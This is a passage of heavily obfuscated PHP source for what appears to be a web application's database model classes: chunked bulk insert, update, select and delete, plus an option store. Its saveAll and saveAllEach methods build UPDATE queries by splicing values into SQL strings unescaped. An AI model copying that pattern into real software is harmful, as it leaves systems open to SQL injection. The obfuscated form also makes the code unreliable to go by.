(!$a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ]) { unset($a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ]); } break; } if (isset($a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ])) { array_unshift($dåßöµ¡Ã‘, $a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ]); } if ($f…¿‰õŠÜÃ[317] == $FŞµºÓ¨†[3]) { $a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ] = call_user_func_array($báÇ‹³Ü–, $dåßöµ¡Ã‘); } else { $a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ] = call_user_func_array(array(&$this, $báÇ‹³Ü–), $dåßöµ¡Ã‘); } break; case $f…¿‰õŠÜÃ[269]: $a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ] = $a¶´´ ŠíÄ[$FŞµºÓ¨†[1]]; break; case $f…¿‰õŠÜÃ[290]: if (isset($a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ]) && !is_string($a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ])) { $a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ] = json_encode_force($a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ]); } break; case $f…¿‰õŠÜÃ[319]: if ($a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ] === $f…¿‰õŠÜÃ[33]) { unset($a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ]); } break; case $f…¿‰õŠÜÃ[320]: $a¶´´ ŠíÄ[$BŸó¸†¢ÊÃ] = $FŞµºÓ¨†[1]; default: break; } } if ($bß‘ò›ç… == $f…¿‰õŠÜÃ[353]) { $b¥ÜŒÅêÂ = strtolower($this->db->getDbType()); if (strpos($b¥ÜŒÅêÂ, $f…¿‰õŠÜÃ[9]) !== 0) { return; } $f‡š‡òíí = $this->field(!0)->fields; $c…ß©äŠ˜ = $f‡š‡òíí[$f…¿‰õŠÜÃ[248]]; if (isset($f‡š‡òíí[$f…¿‰õŠÜÃ[247]])) { unset($c…ß©äŠ˜[$f‡š‡òíí[$f…¿‰õŠÜÃ[247]]]); } foreach ($c…ß©äŠ˜ as $b¹ù……™š => $bß‘ò›ç…) { if (!isset($a¶´´ ŠíÄ[$b¹ù……™š])) { $a¶´´ ŠíÄ[$b¹ù……™š] = $f…¿‰õŠÜÃ[33]; } } } } private function dataAfterFilter(&$D“»¯¢Ğ) { $c”‘›²õÛµ =& $_SERVER[¹…ÕÄ]; foreach ($this->dataAuto as $c”êÓ¾¬ë”) { $fÚíè¨ˆë = $c”êÓ¾¬ë”[0]; if (!in_array($c”‘›²õÛµ[355], explode($c”‘›²õÛµ[47], $c”êÓ¾¬ë”[2]))) { continue; } if (!isset($D“»¯¢Ğ[$fÚíè¨ˆë])) { continue; } switch (trim($c”êÓ¾¬ë”[3])) { case $c”‘›²õÛµ[317]: case $c”‘›²õÛµ[318]: $EŠ‘Æ®Ÿ´‰ = isset($c”êÓ¾¬ë”[4]) ? (array) $c”êÓ¾¬ë”[4] : array(); array_unshift($EŠ‘Æ®Ÿ´‰, $D“»¯¢Ğ[$fÚíè¨ˆë]); if ($c”‘›²õÛµ[317] == $c”êÓ¾¬ë”[3]) { $D“»¯¢Ğ[$fÚíè¨ˆë] = call_user_func_array($c”êÓ¾¬ë”[1], $EŠ‘Æ®Ÿ´‰); } else { $D“»¯¢Ğ[$fÚíè¨ˆë] = call_user_func_array(array(&$this, $c”êÓ¾¬ë”[1]), $EŠ‘Æ®Ÿ´‰); } break; case $c”‘›²õÛµ[269]: $D“»¯¢Ğ[$fÚíè¨ˆë] = $D“»¯¢Ğ[$c”êÓ¾¬ë”[1]]; break; case $c”‘›²õÛµ[290]: $F‰Ğ”Ä…í‚ = $D“»¯¢Ğ[$fÚíè¨ˆë]; $D“»¯¢Ğ[$fÚíè¨ˆë] = json_decode($F‰Ğ”Ä…í‚, !0); if (is_null($D“»¯¢Ğ[$fÚíè¨ˆë])) { $D“»¯¢Ğ[$fÚíè¨ˆë] = $F‰Ğ”Ä…í‚; } break; case $c”‘›²õÛµ[319]: if ($D“»¯¢Ğ[$fÚíè¨ˆë] === $c”‘›²õÛµ[33]) { unset($D“»¯¢Ğ[$fÚíè¨ˆë]); } break; case $c”‘›²õÛµ[320]: $D“»¯¢Ğ[$fÚíè¨ˆë] = $c”êÓ¾¬ë”[1]; default: break; } } } public function saveAll($BÀäÁÖ×«¸) { goto F±º™ŸŒÊ„; dƒ÷¿ß³Ôå: $F¦÷¶µÇÚÔ = array(); $aßèÑ’Êãë = count($BÀäÁÖ×«¸); for ($eÖÓôÂ Ç‘ = 0; $eÖÓôÂ Ç‘ < $aßèÑ’Êãë; $eÖÓôÂ Ç‘++) { $AÈ³›µ®İì = $BÀäÁÖ×«¸[$eÖÓôÂ Ç‘]; if (!is_array($AÈ³›µ®İì) || count($AÈ³›µ®İì) != 4) { continue; } $AùïÍ‹Í = "\x55\120\104\101\124\x45\40\140{$D ­Ïî‘ÚÉ}\140\40\x53\x45\124\40{$AÈ³›µ®İì[2]}\x20\75\x20\x43\x41\x53\x45\40{$AÈ³›µ®İì[0]}\x20\xa"; if ($f•àİå‘Ô == 0) { $BÌ»ñ²¨„³ = $AùïÍ‹Í; } $F¦÷¶µÇÚÔ[] = $d½­†òœÚˆ[115] . $AÈ³›µ®İì[1] . $d½­†òœÚˆ[115]; $f•àİå‘Ô++; $BÌ»ñ²¨„³ .= "\x20\127\x48\x45\x4e\40\x27{$AÈ³›µ®İì[1]}\47\x20\x54\110\x45\116\40\x27{$AÈ³›µ®İì[3]}\x27\40\xa"; if ($f•àİå‘Ô == $CæŠ„ÀÛÒ· || $eÖÓôÂ Ç‘ == $aßèÑ’Êãë - 1) { goto f®ø±®ÏšÔ; f®ø±®ÏšÔ: $B¶Š¢²“ì´ = implode($d½­†òœÚˆ[47], $F¦÷¶µÇÚÔ); $BÌ»ñ²¨„³ .= "\x20\x45\116\x44\40\40\127\x48\105\x52\105\40{$AÈ³›µ®İì[0]}\40\111\x4e\40\50{$B¶Š¢²“ì´}\51\40"; $this->execute($BÌ»ñ²¨„³); goto E»£§â‡Š; E»£§â‡Š: $f•àİå‘Ô = 0; $BÌ»ñ²¨„³ = $AùïÍ‹Í; $this->chunkEventCheck(count($F¦÷¶µÇÚÔ)); goto EìÜç¶¥´; EìÜç¶¥´: $F¦÷¶µÇÚÔ = array(); goto C§›ìÅ‰¬; C§›ìÅ‰¬: } } goto A›¤‹ì–ñ†; A›¤‹ì–ñ†: $this->chunkEventSet(); goto dÑÚ¢»…¹‡; F±º™ŸŒÊ„: $d½­†òœÚˆ =& $_SERVER[¹…ÕÄ]; $D ­Ïî‘ÚÉ = $this->tablePrefix . $this->tableName; $CæŠ„ÀÛÒ· = self::SQL_WHERE_IN_CHUNK; goto C…Û«­Ó¦ğ; C…Û«­Ó¦ğ: $BÀäÁÖ×«¸ = is_array($BÀäÁÖ×«¸) ? $BÀäÁÖ×«¸ : array(); $BÌ»ñ²¨„³ = $d½­†òœÚˆ[373]; $f•àİå‘Ô = 0; goto dƒ÷¿ß³Ôå; dÑÚ¢»…¹‡: } public function saveAllEach($FñÜÕ²›Œ) { $AÀ¯µ’ñšÚ =& $_SERVER[¹…ÕÄ]; $dÛ…˜ÛÙœô = $this->tablePrefix . $this->tableName; foreach ($FñÜÕ²›Œ as $fí„‹· Óª) { if (!is_array($fí„‹· Óª) || count($fí„‹· Óª) != 4) { continue; } $Bîä‹„Í„Ú = $fí„‹· Óª[0] . $AÀ¯µ’ñšÚ[374] . $fí„‹· Óª[1] . $AÀ¯µ’ñšÚ[115]; $C”çÑ¸Şñî = $fí„‹· Óª[2] . $AÀ¯µ’ñšÚ[374] . $fí„‹· Óª[3] . $AÀ¯µ’ñšÚ[115]; $dÄ§ğ˜ëÁ = "\x75\160\144\141\x74\145\40{$dÛ…˜ÛÙœô}\40\x73\145\164\x20{$C”çÑ¸Şñî}\40\x77\x68\x65\x72\x65\x20{$Bîä‹„Í„Ú}\x3b"; $this->execute($dÄ§ğ˜ëÁ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($a‹Ø©•×ùë = false, $d¦Êğ¿‹Ú = false) { $this->_chunkEvent = $a‹Ø©•×ùë; $this->_chunkEventParam = $d¦Êğ¿‹Ú; } private function chunkEventCheck($B¦î»İŠ‚Å) { if (!$this->_chunkEvent) { return; } $BÍŠÔùÁ‰ö = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $BÍŠÔùÁ‰ö[$_SERVER[¹…ÕÄ][375]] = $B¦î»İŠ‚Å; Hook::trigger($this->_chunkEvent, $BÍŠÔùÁ‰ö); } public function addAll($f‰ŸœùËÕš, $Dî¿ÒŞˆÌ… = array(), $FÂçŠÉ‘“İ = false) { goto dÚßôÙõ¾­; dÚßôÙõ¾­: $cŒîğÍ„Ú =& $_SERVER[¹…ÕÄ]; ignore_timeout(); $c¿Ôˆ†§áŠ = self::SQL_WHERE_IN_CHUNK; goto c·–ÇÏ²Òø; DÄ©ÌÈ±÷ê: if (method_exists($this->db, $cŒîğÍ„Ú[268])) { for ($fñ¨±›¿àà = 0; $fñ¨±›¿àà < count($f‰ŸœùËÕš); $fñ¨±›¿àà += $c¿Ôˆ†§áŠ) { $f£ƒŒ÷™·‡ = array_slice($f‰ŸœùËÕš, $fñ¨±›¿àà, $c¿Ôˆ†§áŠ); if (!is_array($f£ƒŒ÷™·‡) || count($f£ƒŒ÷™·‡) == 0) { break; } $B¡æ¥ËøŸ = $this->db->insertAll($f£ƒŒ÷™·‡, $Dî¿ÒŞˆÌ…, $FÂçŠÉ‘“İ); $this->chunkEventCheck(count($f£ƒŒ÷™·‡)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($f‰ŸœùËÕš as $F«†˜š´–– => $FÔ¬²ñ·Ôã) { $B¡æ¥ËøŸ = $this->db->insert($FÔ¬²ñ·Ôã, $Dî¿ÒŞˆÌ…, $FÂçŠÉ‘“İ); } $this->commit(); } if (!1 !== $B¡æ¥ËøŸ) { $dÇÈàğóé = $this->getLastInsID(); if ($dÇÈàğóé) { return $dÇÈàğóé; } } return $B¡æ¥ËøŸ; goto bµë½¼øÔ˜; c·–ÇÏ²Òø: if (empty($f‰ŸœùËÕš)) { $this->error = think_lang($cŒîğÍ„Ú[267]); return !1; } $Dî¿ÒŞˆÌ… = $this->_parseOptions($Dî¿ÒŞˆÌ…); foreach ($f‰ŸœùËÕš as $F«†˜š´–– => $FÔ¬²ñ·Ôã) { $f‰ŸœùËÕš[$F«†˜š´––] = $this->_facade($FÔ¬²ñ·Ôã); $this->_beforeInsert($f‰ŸœùËÕš[$F«†˜š´––], $Dî¿ÒŞˆÌ…); } goto DÄ©ÌÈ±÷ê; bµë½¼øÔ˜: } public function save($bÈÅ¸ˆáä = '', $BìÀ Î•»› = array()) { goto D‹ŠŠš“åÁ; Añ÷âã»±Õ: $fÂ¢…Ã÷ˆî = $this->findWhereField($Dî‰³óá×); if (!$fÂ¢…Ã÷ˆî) { return parent::save($bÈÅ¸ˆáä, $BìÀ Î•»›); } $F‹ØÄ‰œ˜³ = 0; goto eïˆ……öÉ–; D‡Ù…˜ïÓ: for ($féÂ¢²Ì‡† = 0; $féÂ¢²Ì‡† < $aáãğôÑ³Ü; $féÂ¢²Ì‡† += $E„áÚà¡³—) { $B­é£²Ğâ’ = array_slice($C¤Œ‹ê•âÓ, $féÂ¢²Ì‡†, $E„áÚà¡³—); if (!is_array($B­é£²Ğâ’) || count($B­é£²Ğâ’) == 0) { break; } $Dî‰³óá×[$DğºÌ‘¢£´[271]][$fÂ¢…Ã÷ˆî][1] = $B­é£²Ğâ’; $this->optionsValue($Dî‰³óá×); $F‹ØÄ‰œ˜³ += parent::save($bÈÅ¸ˆáä, $BìÀ Î•»›); $this->chunkEventCheck(count($B­é£²Ğâ’)); } $this->chunkEventSet(); return $F‹ØÄ‰œ˜³; goto e¬ÚŒš©‘ù; D‹ŠŠš“åÁ: $DğºÌ‘¢£´ =& $_SERVER[¹…ÕÄ]; $E„áÚà¡³— = self::SQL_WHERE_IN_CHUNK; $Dî‰³óá× = $this->optionsValue(); goto Añ÷âã»±Õ; eïˆ……öÉ–: $C¤Œ‹ê•âÓ = $Dî‰³óá×[$DğºÌ‘¢£´[271]][$fÂ¢…Ã÷ˆî][1]; $C¤Œ‹ê•âÓ = is_array($C¤Œ‹ê•âÓ) ? $C¤Œ‹ê•âÓ : array(); $aáãğôÑ³Ü = count($C¤Œ‹ê•âÓ); goto D‡Ù…˜ïÓ; e¬ÚŒš©‘ù: } public function add($CùÇ¹íÉ½Ä = '', $e¶ÏÃ¸äÛ„ = array(), $A¬®¼öÕ‘Ø = false) { if ($this->addTaskStatus && is_array($CùÇ¹íÉ½Ä)) { $this->addTaskData[] = $CùÇ¹íÉ½Ä; return; } return parent::add($CùÇ¹íÉ½Ä, $e¶ÏÃ¸äÛ„, $A¬®¼öÕ‘Ø); } public function parseWhereLike($a‰¯Œï›µ, $E´¸òÕ¼ëŠ = '', $Fè º‡†¥‘ = false, &$DİÑÓ®¶Ê‹ = false) { goto eŞ±¶–ª×¹; bˆšÉÍÊ¾ë: if (!is_array($a‰¯Œï›µ)) { return $a‰¯Œï›µ; } $FÇÉÛ® = array(); $f›×¾­ì¬î = 0; goto aÎ®ƒ­ ˜; aÎ®ƒ­ ˜: foreach ($a‰¯Œï›µ as $C¹‰à ‚Å¬ => $a²İÅŠ†¤) { if (is_array($a²İÅŠ†¤) && count($a²İÅŠ†¤) == 2 && $a²İÅŠ†¤[0] == $c‘íÒÒ›äŠ[378] && is_string($a²İÅŠ†¤[1]) && substr($a²İÅŠ†¤[1], 0, 1) == $c‘íÒÒ›äŠ[379] && substr($a²İÅŠ†¤[1], strlen($a²İÅŠ†¤[1]) - 1, 1) == $c‘íÒÒ›äŠ[379]) { goto BŞŸíÙ•í; CŞîÄîÜª: $F£µº¨Ş = $this->db->escapeString($F£µº¨Ş); if (!strpos($CÎå¤íÆíº, $c‘íÒÒ›äŠ[94])) { $CÎå¤íÆíº = $c‘íÒÒ›äŠ[380] . $CÎå¤íÆíº . $c‘íÒÒ›äŠ[380]; } if ($bÇáÀŒÓß[$c‘íÒÒ›äŠ[381]]) { $F£µº¨Ş = $c‘íÒÒ›äŠ[115] . $F£µº¨Ş . $c‘íÒÒ›äŠ[115]; } goto E‹¬Æô ¦á; E‹¬Æô ¦á: $FÇÉÛ®[$f›×¾­ì¬î] = $c‘íÒÒ›äŠ[382] . $CÎå¤íÆíº . $c‘íÒÒ›äŠ[383] . $F£µº¨Ş . $c‘íÒÒ›äŠ[384]; $f›×¾­ì¬î++; continue; goto fóã–‰º; BŞŸíÙ•í: $DİÑÓ®¶Ê‹ = !0; $CÎå¤íÆíº = is_string($C¹‰à ‚Å¬) ? $C¹‰à ‚Å¬ : $E´¸òÕ¼ëŠ; $F£µº¨Ş = substr($a²İÅŠ†¤[1], 1, strlen($a²İÅŠ†¤[1]) - 2); goto CŞîÄîÜª; fóã–‰º: } if (is_array($a²İÅŠ†¤)) { $E´¸òÕ¼ëŠ = is_string($C¹‰à ‚Å¬) ? $C¹‰à ‚Å¬ : $E´¸òÕ¼ëŠ; $a²İÅŠ†¤ = $this->parseWhereLike($a²İÅŠ†¤, $E´¸òÕ¼ëŠ, !0, $DİÑÓ®¶Ê‹); } if (is_numeric($C¹‰à ‚Å¬)) { $FÇÉÛ®[$f›×¾­ì¬î] = $a²İÅŠ†¤; $f›×¾­ì¬î++; } else { $FÇÉÛ®[$C¹‰à ‚Å¬] = $a²İÅŠ†¤; } } if ($DİÑÓ®¶Ê‹ && !$Fè º‡†¥‘) { trace_log(array($FÇÉÛ®, $a‰¯Œï›µ), $c‘íÒÒ›äŠ[271]); } return $FÇÉÛ®; goto cÍ¯´…ùÍê; eŞ±¶–ª×¹: $c‘íÒÒ›äŠ =& $_SERVER[¹…ÕÄ]; $bÇáÀŒÓß = $GLOBALS[$c‘íÒÒ›äŠ[6]][$c‘íÒÒ›äŠ[376]]; if (!$bÇáÀŒÓß[$c‘íÒÒ›äŠ[377]]) { return $a‰¯Œï›µ; } goto bˆšÉÍÊ¾ë; cÍ¯´…ùÍê: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($F††÷Ó¦ƒ¿ = array()) { goto DßŞÕÒ ©„; DßŞÕÒ ©„: $f‘ãÕÔ¡Ï =& $_SERVER[¹…ÕÄ]; $C‚„ÏñæŒ¦ = self::SQL_WHERE_IN_CHUNK; $eÓˆ‡›ËğÏ = $this->optionsValue(); goto aŒ²¹Åèóò; Eçø¶ ã: $b¢ÛŠ´Ù£½ = is_array($b¢ÛŠ´Ù£½) ? $b¢ÛŠ´Ù£½ : array(); $b‹Ø×ŒÌ¼µ = null; for ($D½›ÆÀÚ = 0; $D½›ÆÀÚ < count($b¢ÛŠ´Ù£½); $D½›ÆÀÚ += $C‚„ÏñæŒ¦) { $Bèº¡œ—Ä = array_slice($b¢ÛŠ´Ù£½, $D½›ÆÀÚ, $C‚„ÏñæŒ¦); if (!is_array($Bèº¡œ—Ä) || count($Bèº¡œ—Ä) == 0) { break; } $eÓˆ‡›ËğÏ[$f‘ãÕÔ¡Ï[271]][$aˆ©‰«ÆÌò][1] = $Bèº¡œ—Ä; $this->optionsValue($eÓˆ‡›ËğÏ); $c¯‰ˆº¤Ë´ = parent::select($F††÷Ó¦ƒ¿); if (!$c¯‰ˆº¤Ë´) { continue; } if (is_null($b‹Ø×ŒÌ¼µ)) { $b‹Ø×ŒÌ¼µ = array(); } $b‹Ø×ŒÌ¼µ = array_merge($b‹Ø×ŒÌ¼µ, $c¯‰ˆº¤Ë´); } goto cÖì¯ÙÏÈ; cÖì¯ÙÏÈ: return $b‹Ø×ŒÌ¼µ; goto cÛ¤ÔÛÄà; aŒ²¹Åèóò: $aˆ©‰«ÆÌò = $this->findWhereField($eÓˆ‡›ËğÏ); if (!$aˆ©‰«ÆÌò || isset($eÓˆ‡›ËğÏ[$f‘ãÕÔ¡Ï[288]]) || isset($eÓˆ‡›ËğÏ[$f‘ãÕÔ¡Ï[349]])) { return parent::select($F††÷Ó¦ƒ¿); } $b¢ÛŠ´Ù£½ = $eÓˆ‡›ËğÏ[$f‘ãÕÔ¡Ï[271]][$aˆ©‰«ÆÌò][1]; goto Eçø¶ ã; cÛ¤ÔÛÄà: } public function delete($E©ÒëïƒÍ± = array()) { goto c¦Ö¶õÅ‚; eù‹£Ç¸ÇÔ: return $Eæ§¸“Û¾; goto bËğí–òš; c¦Ö¶õÅ‚: $DİĞ¸ÑíÅ– =& $_SERVER[¹…ÕÄ]; $F¸ÃÈâ ß = self::SQL_WHERE_IN_CHUNK; $cª°¤“†à = $this->optionsValue(); goto eŠ‘·¦”Ç«; eŠ‘·¦”Ç«: $FÍéŠš‚Ô¤ = $this->findWhereField($cª°¤“†à); if (!$FÍéŠš‚Ô¤) { return parent::delete($E©ÒëïƒÍ±); } $Eæ§¸“Û¾ = 0; goto a¢ç»­ÜÆ; a¢ç»­ÜÆ: $F½‰ö“ë´‡ = $cª°¤“†à[$DİĞ¸ÑíÅ–[271]][$FÍéŠš‚Ô¤][1]; $F½‰ö“ë´‡ = is_array($F½‰ö“ë´‡) ? $F½‰ö“ë´‡ : array(); for ($E²¨÷äøÑ = 0; $E²¨÷äøÑ < count($F½‰ö“ë´‡); $E²¨÷äøÑ += $F¸ÃÈâ ß) { $dí†º‘ÒÃ = array_slice($F½‰ö“ë´‡, $E²¨÷äøÑ, $F¸ÃÈâ ß); if (!is_array($dí†º‘ÒÃ) || count($dí†º‘ÒÃ) == 0) { break; } $cª°¤“†à[$DİĞ¸ÑíÅ–[271]][$FÍéŠš‚Ô¤][1] = $dí†º‘ÒÃ; $this->optionsValue($cª°¤“†à); $Eæ§¸“Û¾ += parent::delete($E©ÒëïƒÍ±); } goto eù‹£Ç¸ÇÔ; bËğí–òš: } private function findWhereField($cçäñâŒ‰) { $F­½ê„ò«ö =& $_SERVER[¹…ÕÄ]; $aÂÌÉì‚Š = self::SQL_WHERE_IN_CHUNK; if (!is_array($cçäñâŒ‰) || !is_array($cçäñâŒ‰[$F­½ê„ò«ö[271]])) { return !1; } foreach ($cçäñâŒ‰[$F­½ê„ò«ö[271]] as $Bï‚©ĞùÜ => $bšİ–Ä·¢) { if (is_array($bšİ–Ä·¢) && isset($bšİ–Ä·¢[0]) && is_string($bšİ–Ä·¢[0]) && strtolower($bšİ–Ä·¢[0]) == $F­½ê„ò«ö[7] && is_array($bšİ–Ä·¢[1]) && count($bšİ–Ä·¢[1]) > $aÂÌÉì‚Š) { ignore_timeout(); return $Bï‚©ĞùÜ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\x6d\x4f\160\164\151\x6f\156"; public $field = array(); public function listData($Cø•÷¾ï¾ = false, $BŒÂÂÃ§´» = "\155\x6f\144\x69\146\171\x54\x69\x6d\145", $b¥ƒõßÌš¶ = false) { $f´¥·®¶Á = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$f´¥·®¶Á) { return $Cø•÷¾ï¾ ? null : array(); } if (!$Cø•÷¾ï¾) { $f´¥·®¶Á = array_filter(array_values($f´¥·®¶Á)); return array_sort_by($f´¥·®¶Á, $BŒÂÂÃ§´», $b¥ƒõßÌš¶); } return $f´¥·®¶Á[$_SERVER[¹…ÕÄ][385] . $Cø•÷¾ï¾]; } public function insert($A„ô–æÑ‡È) { goto fÜİ¢…’ç»; fÜİ¢…’ç»: $DÁàï”´§ë =& $_SERVER[¹…ÕÄ]; $A„ô–æÑ‡È = array_field_key($A„ô–æÑ‡È, $this->field); $BãÂ”ù˜® = Model($this->modelType)->get($DÁàï”´§ë[386], $this->optionType . $DÁàï”´§ë[387]); goto fêæ³½ÙÍ; fêæ³½ÙÍ: $BãÂ”ù˜® = $BãÂ”ù˜® ? $BãÂ”ù˜® : 0; $A„ô–æÑ‡È[$DÁàï”´§ë[388]] = ++$BãÂ”ù˜®; $A„ô–æÑ‡È[$DÁàï”´§ë[192]] = time(); goto DßÅÎ©á”; DßÅÎ©á”: $A„ô–æÑ‡È[$DÁàï”´§ë[83]] = time(); Model($this->modelType)->set($DÁàï”´§ë[386], $BãÂ”ù˜®, $this->optionType . $DÁàï”´§ë[387]); Model($this->modelType)->set($DÁàï”´§ë[385] . $BãÂ”ù˜®, $A„ô–æÑ‡È, $this->optionType); goto b¤†Å‹¨¢½; b¤†Å‹¨¢½: return $BãÂ”ù˜®; goto BíÆÙ ¢; BíÆÙ ¢: } public function update($aÅ¤¯ã‘©ğ, $FÔšˆÌå†) { goto cŒ•æöá; CÚãºÌ©‰¶: if (!$d¥«í¡Şá±) { return !1; } $FÔšˆÌå† = array_merge($d¥«í¡Şá±, $FÔšˆÌå†); $FÔšˆÌå†[$CŒè‚¯³„[83]] = time(); goto Aù…Ò•éÉ‰; Aù…Ò•éÉ‰: return Model($this->modelType)->set($CŒè‚¯³„[385] . $aÅ¤¯ã‘©ğ, $FÔšˆÌå†, $this->optionType); goto E¿á Ì«¦Ó; cŒ•æöá: $CŒè‚¯³„ =& $_SERVER[¹…ÕÄ]; $FÔšˆÌå† = array_field_key($FÔšˆÌå†, $this->field); $d¥«í¡Şá± = $this->listData($aÅ¤¯ã‘©ğ); goto CÚãºÌ©‰¶; E¿á Ì«¦Ó: } public function remove($c¤‚ƒé…Û¥) { return Model($this->modelType)->remove($_SERVER[¹…ÕÄ][385] . $c¤‚ƒé…Û¥, $this->optionType); } public function clear() { $DÚäˆ¸¨³¶ =& $_SERVER[¹…ÕÄ]; Model($this->modelType)->remove($DÚäˆ¸¨³¶[386], $this->optionType . $DÚäˆ¸¨³¶[387]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Eç¦ëˆÓÙ, $D”¨ïÜ—™æ) { if (!$D”¨ïÜ—™æ) { return !1; } $A¬ğ™ğ = $this->listData(); $A¬ğ™ğ = array_to_keyvalue($A¬ğ™ğ, $Eç¦ëˆÓÙ); return isset($A¬ğ™ğ[$D”¨ïÜ—™æ]) ? $A¬ğ™ğ[$D”¨ïÜ—™æ] : !1; } public function findByName($bÚ”½‚Ÿì–) { return $this->findByKey($_SERVER[¹…ÕÄ][28], $bÚ”½‚Ÿì–); } protected function resetData($bîÅÏ¬øÇÏ) { $B¯»’ƒù‹¯ =& $_SERVER[¹…ÕÄ]; $bîÅÏ¬øÇÏ = is_array($bîÅÏ¬øÇÏ) ? $bîÅÏ¬øÇÏ : array(); $F¯‡©¤ëìÒ = array(); for ($AÇ’ùŞ™ = 0; $AÇ’ùŞ™ < count($bîÅÏ¬øÇÏ); $AÇ’ùŞ™++) { $F¯‡©¤ëìÒ[$B¯»’ƒù‹¯[385] . $bîÅÏ¬øÇÏ[$AÇ’ùŞ™][$B¯»’ƒù‹¯[388]]] = $bîÅÏ¬øÇÏ[$AÇ’ùŞ™]; } return Model($this->modelType)->set($F¯‡©¤ëìÒ, !1, $this->optionType); } private function getAutoName($d•ŞÄèâ‹Ã) { $d±…éÈô’² = array_to_keyvalue($this->listData(), $_SERVER[¹…ÕÄ][28]); if (!$d±…éÈô’² || !isset($d±…éÈô’²[$d•ŞÄèâ‹Ã])) { return $d•ŞÄèâ‹Ã; } for ($C¶š›«øÊµ = 1; $C¶š›«øÊµ < count($d±…éÈô’²); $C¶š›«øÊµ++) { $fÔÆÔÃé®Ù = $d•ŞÄèâ‹Ã . "\x28{$C¶š›«øÊµ}\x29"; if (!isset($d±…éÈô’²[$fÔÆÔÃé®Ù])) { return $fÔÆÔÃé®Ù; } } return $fÔÆÔÃé®Ù; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($cĞ©àÁ‰¦œ = false, $eä˜Ë¬¼– = '', $Fê÷áÜ¬ÛŸ = false) { goto A¸áÙ÷í±; Eµˆ¢ŠÇØï: $AÏÖ÷êà¼ = is_array($AÏÖ÷êà¼) ? $AÏÖ÷êà¼ : array(); if (is_array($DèÖíæ‡¿)) { $DèÖíæ‡¿ = array_merge($AÏÖ÷êà¼, $DèÖíæ‡¿); return $cĞ©àÁ‰¦œ ? isset($DèÖíæ‡¿[$cĞ©àÁ‰¦œ]) ? $DèÖíæ‡¿[$cĞ©àÁ‰¦œ] : null : $DèÖíæ‡¿; } $C‘ØÆÂƒìß = $this->filterWhere(array($báï¦ŒéÙ[29] => $eä˜Ë¬¼–)); goto AÆÀĞ÷’‹ø; AÆÀĞ÷’‹ø: $DèÖíæ‡¿ = $this->where($C‘ØÆÂƒìß)->select(); $DèÖíæ‡¿ = array_to_keyvalue($DèÖíæ‡¿, $báï¦ŒéÙ[92], $báï¦ŒéÙ[370]); foreach ($DèÖíæ‡¿ as $Eßµ‰É†å => $FÏõğé°‚£) { if ($Fê÷áÜ¬ÛŸ || in_array($Eßµ‰É†å, $this->jsonField)) { $DèÖíæ‡¿[$Eßµ‰É†å] = json_decode($FÏõğé°‚£, !0); } } goto dæ¤ˆÒÄª­; dæ¤ˆÒÄª­: $this->cacheSet($eä˜Ë¬¼–, $DèÖíæ‡¿); $DèÖíæ‡¿ = array_merge($AÏÖ÷êà¼, $DèÖíæ‡¿); return $cĞ©àÁ‰¦œ ? $DèÖíæ‡¿[$cĞ©àÁ‰¦œ] : $DèÖíæ‡¿; goto CĞğ”¤ê‡Ó; A¸áÙ÷í±: $báï¦ŒéÙ =& $_SERVER[¹…ÕÄ]; $DèÖíæ‡¿ = $this->cacheGet($eä˜Ë¬¼–); $AÏÖ÷êà¼ = $this->optionDefault($eä˜Ë¬¼–); goto Eµˆ¢ŠÇØï; CĞğ”¤ê‡Ó: } public function set($c˜ğæîä, $b»İ¼ÀòÉ = false, $BŠ¢İÅÃ÷Š = '') { goto c´­ÖÑ»¨; c…‘Û¾ÌÈÆ: return $this->addAll($D áÎ÷Ì†, array(), !0); goto cÀ‡½ø¥Ü†; BÃÂ™´øİƒ: $FØ¸¨”‰¦… = is_array($c˜ğæîä) ? $c˜ğæîä : array($c˜ğæîä => $b»İ¼ÀòÉ); foreach ($FØ¸¨”‰¦… as $e›ì¸õ´¤è => $C‚íÇÙª) { if (is_array($C‚íÇÙª)) { $C‚íÇÙª = json_encode_force($C‚íÇÙª); } $this->checkLength($C‚íÇÙª, !1, $this->tableName . $c»æè‡×ó[4] . $c˜ğæîä); $C‚íÇÙª = self::textEncode($C‚íÇÙª); $FØ¸¨”‰¦… = array($c»æè‡×ó[29] => $BŠ¢İÅÃ÷Š, $c»æè‡×ó[92] => $e›ì¸õ´¤è, $c»æè‡×ó[370] => $C‚íÇÙª); $D áÎ÷Ì†[] = $this->filterWhere($FØ¸¨”‰¦…); } if (!$D áÎ÷Ì†) { return !0; } goto c…‘Û¾ÌÈÆ; c´­ÖÑ»¨: $c»æè‡×ó =& $_SERVER[¹…ÕÄ]; $this->cacheRemove($BŠ¢İÅÃ÷Š); $D áÎ÷Ì† = array(); goto BÃÂ™´øİƒ; cÀ‡½ø¥Ü†: } protected function optionDefault($D˜øˆ¹¥ç‰ = '') { return !1; } public function setDeep($f–¥†Î·ìÊ, $c„Ö‡‚ŒÉÆ = false, $EŒÚÆßÑ½¤ = '') { $e˜†Ïåˆ”¯ = explode($_SERVER[¹…ÕÄ][94], $f–¥†Î·ìÊ); $fº„ƒ¸õ = $this->get(); array_set_value($fº„ƒ¸õ, $f–¥†Î·ìÊ, 